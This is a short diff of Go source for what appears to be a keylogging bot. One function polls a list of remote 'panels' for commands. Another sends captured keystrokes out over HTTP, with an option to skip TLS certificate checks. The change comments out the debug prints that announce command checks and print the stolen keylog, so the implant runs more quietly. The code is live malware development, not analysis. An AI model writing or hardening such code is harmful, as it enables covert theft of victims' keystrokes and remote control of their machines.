@@ -57,7 +57,7 @@ func checkCommand() {
 		client := &http.Client{}
 		for {
 			time.Sleep(time.Duration(randInt(checkEveryMin, checkEveryMax)) * time.Second)
-			fmt.Println("Check CMD")
+			// fmt.Println("Check CMD")
 			for i := 0; i < len(httpPanels); i++ {
 				req, _ := http.NewRequest("GET", httpPanels[i]+"command", nil)
 				req.Header.Set("User-Agent", userAgentKey)
@@ -172,7 +172,7 @@ func sendKeylog(ch <-chan struct{}) {
 		// if tmpKeylog != "" {
 		select {
 		case _ = <-ch:
-			fmt.Println(tmpKeylog)
+			// fmt.Println(tmpKeylog)
 			if useSSL {
 				tr := &http.Transport{
 					TLSClientConfig: &tls.Config{InsecureSkipVerify: sslInsecureSkipVerify},
